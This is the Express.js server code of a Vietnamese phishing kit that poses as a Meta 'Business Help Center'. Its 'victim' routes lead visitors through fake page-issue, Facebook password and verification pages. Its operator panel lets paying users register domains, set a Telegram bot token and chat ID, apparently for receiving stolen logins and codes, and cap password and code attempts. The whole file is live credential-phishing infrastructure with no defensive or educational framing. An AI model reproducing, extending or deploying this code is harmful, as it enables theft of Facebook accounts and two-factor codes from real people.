import cookieParser from 'cookie-parser';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import Database from './modules/database.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const db = new Database();

const app = express();
const port = 3000;
const hostName = '0.0.0.0';

app.set('views', path.join(__dirname, 'public'));
app.set('view engine', 'ejs');

app.use((req, res, next) => {
    if (req.path.endsWith('.ejs')) {
        return res.status(403).send('<div style="font-size: 36px; text-align: center; margin-top: 20%; font-weight: bold; color: red;">LÀM GÌ THẾ EM???</div>');
    }
    next();
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser('con-meo-bu'));

const isAuthenticated = (req, res, next) => {
    const user = req.signedCookies.user;
    if (!user) {
        return res.redirect('/admin/login');
    }
    req.user = JSON.parse(user);
    next();
};
app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập tên đăng nhập và mật khẩu'
        });
    }

    try {
        const user = await db.getUserByUsername(username);
        if (!user) {
            return res.status(401).json({
                success: false,
                message: 'Tài khoản không tồn tại'
            });
        }

        if (user.password !== password) {
            return res.status(401).json({
                success: false,
                message: 'Mật khẩu không chính xác'
            });
        }

        const { password: _, ...userInfo } = user;

        res.cookie('user', JSON.stringify(userInfo), {
            signed: true,
            maxAge: 24 * 60 * 60 * 1000
        });

        return res.status(200).json({
            success: true,
            user: userInfo,
            message: 'Đăng nhập thành công'
        });
    } catch {
        return res.status(500).json({
            success: false,
            message: 'Lỗi server'
        });
    }
});
app.post('/api/activate-vps', async (req, res) => {
    const { username, password, role, vps_name, ip } = req.body;

    if (!username || !password || !role || !vps_name || !ip) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập đầy đủ thông tin'
        });
    }

    try {
        const result = await db.addNewUser(username, password, role, vps_name, ip);
        if (result === null) {
            return res.status(500).json({
                success: false,
                message: `Đã xảy ra lỗi khi thêm VPS ${vps_name}`
            });
        }

        return res.status(200).json({
            success: true,
            message: `Kích Hoạt VPS ${vps_name} thành công !`
        });
    } catch {
        return res.status(500).json({
            success: false,
            message: 'Lỗi server'
        });
    }
});

app.post('/api/add-domain', isAuthenticated, async (req, res) => {
    if (req.user.username === '') {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập tên miền'
        });
    } else {
        const username = req.user.username;
        const domain = req.body.domain;
        try {
            await db.addDomain(username, domain);
            return res.status(200).json({
                success: true,
                message: 'Thêm tên miền thành công'
            });
        } catch {
            return res.status(500).json({
                success: false,
                message: 'Lỗi server'
            });
        }
    }
});
app.delete('/api/delete-domain', isAuthenticated, async (req, res) => {
    if (req.user.username === '') {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập tên miền'
        });
    } else {
        const username = req.user.username;
        const domain = req.body.domain;
        try {
            await db.deleteDomain(username, domain);
            return res.status(200).json({
                success: true,
                message: 'Xóa tên miền thành công'
            });
        } catch {
            return res.status(500).json({
                success: false,
                message: 'Lỗi server'
            });
        }
    }
});

app.post('/api/telegram-config', isAuthenticated, async (req, res) => {
    if (req.user.username === '') {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập tên đăng nhập'
        });
    } else {
        const username = req.user.username;
        const chatId = req.body.chatId;
        const telegramToken = req.body.telegramToken;
        try {
            await db.setTelegramByUsername(username, chatId, telegramToken);
            return res.status(200).json({
                success: true,
                message: 'Cập nhật cấu hình Telegram thành công'
            });
        } catch {
            return res.status(500).json({
                success: false,
                message: 'Lỗi server'
            });
        }
    }
});

app.post('/api/website-config', isAuthenticated, async (req, res) => {
    if (req.user.username === '') {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập tên đăng nhập'
        });
    } else {
        const username = req.user.username;
        const maxPasswordAttempts = req.body.maxPasswordAttempts;
        const maxCodeAttempts = req.body.maxCodeAttempts;
        try {
            await db.setWebsiteConfig(username, maxPasswordAttempts, maxCodeAttempts);
            return res.status(200).json({
                success: true,
                message: 'Cập nhật cài đặt website thành công'
            });
        } catch {
            return res.status(500).json({
                success: false,
                message: 'Lỗi server'
            });
        }
    }
});

app.delete('/api/delete-user/:username', async (req, res) => {
    const { username } = req.params;

    if (!username) {
        return res.status(400).json({
            success: false,
            message: 'Vui lòng nhập tên đăng nhập'
        });
    }

    try {
        const result = await db.deleteUser(username);
        if (result === null) {
            return res.status(500).json({
                success: false,
                message: `Đã xảy ra lỗi khi huỷ kích hoạt VPS`
            });
        }

        return res.status(200).json({
            success: true,
            message: `Huỷ kích hoạt VPS thành công !`
        });
    } catch (err) {
        return res.status(500).json({
            success: false,
            message: 'Lỗi server'
        });
    }
});
app.get('/', async (req, res) => {
    const currentDomain = req.hostname;
    const data = await db.getSettingsByDomain(currentDomain);
    res.render('victim/index', { title: 'Business Help Center', data: data });
});
app.get('/meta', (req, res) => {
    res.render('victim/meta', { title: 'Business Help Center', nextPageUrl: '/meta/page-issues' });
});
app.get('/meta/page-issues', (req, res) => {
    res.render('victim/meta-page-issues', { title: 'Business Help Center', nextPageUrl: '/meta/password' });
});
app.get('/meta/password', (req, res) => {
    res.render('victim/meta-password', { title: 'Facebook', nextPageUrl: '/meta/verification' });
});
app.get('/meta/verification', (req, res) => {
    res.render('victim/meta-verification', { title: 'Facebook' });
});

app.get('/admin', isAuthenticated, async (req, res) => {
    if (req.user.role === 'admin') {
        try {
            const users = await db.getListUsers();
            res.render('admin/admin', {
                title: 'Admin Panel',
                user: req.user,
                users: users
            });
        } catch {
            res.render('admin/admin', {
                title: 'Panel',
                user: req.user,
                users: [],
                error: 'Không thể tải danh sách người dùng'
            });
        }
    } else {
        const username = req.user.username;
        const domains = await db.getDomainsByUsername(username);
        const telegramConfig = await db.getTelegramByUsername(username);
        const websiteConfig = await db.getSettingsByUsername(username);
        res.render('admin/user', { title: 'User Panel', user: req.user, domains: domains, telegramConfig: telegramConfig, websiteConfig: websiteConfig });
    }
});

app.get('/admin/login', (req, res) => {
    if (req.signedCookies.user) {
        return res.redirect('/admin');
    }
    res.render('admin/login', { title: 'Admin Login' });
});

app.get('/admin/logout', (req, res) => {
    res.clearCookie('user');
    res.redirect('/admin/login');
});

app.listen(port, hostName, () => {
    console.log(`server listening on http://localhost:${port}`);
});
